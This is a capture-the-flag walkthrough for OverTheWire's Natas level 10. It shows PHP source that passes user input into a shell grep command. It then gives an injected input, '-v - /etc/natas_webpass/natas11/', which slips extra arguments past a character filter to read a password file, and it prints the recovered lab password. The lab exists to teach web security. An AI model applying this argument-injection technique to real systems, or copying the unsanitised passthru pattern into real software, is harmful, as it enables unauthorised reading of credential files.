`Link` : `https://overthewire.org/wargames/natas/natas10.html`
## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟗 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟎

## 𝐆𝐢𝐯𝐞𝐧

- Username: natas10
- URL:      `http://natas10.natas.labs.overthewire.org`


## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit: `http://natas10.natas.labs.overthewire.org`
- `view sourcecode`
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

- `if(preg_match('/[;|&]/',$key)) {` : Note that the input is filtered this time!
- What can be done to bypass this? Nothing
- Only thing we can do is use `$key` effectively to get password from `/etc/natas_webpass/natas11/`
- How do we do that? note that `-` isn't bypassed
- when we do `grep -v - filename` : it works the same way as `cat filename`
- submit this input `-v - /etc/natas_webpass/natas11/`
- Damn! You saw that - that's the password.

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/148775175-fb3afe1a-3cca-47dc-8e99-14d08936074f.png width=500px>
</div>

- `/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
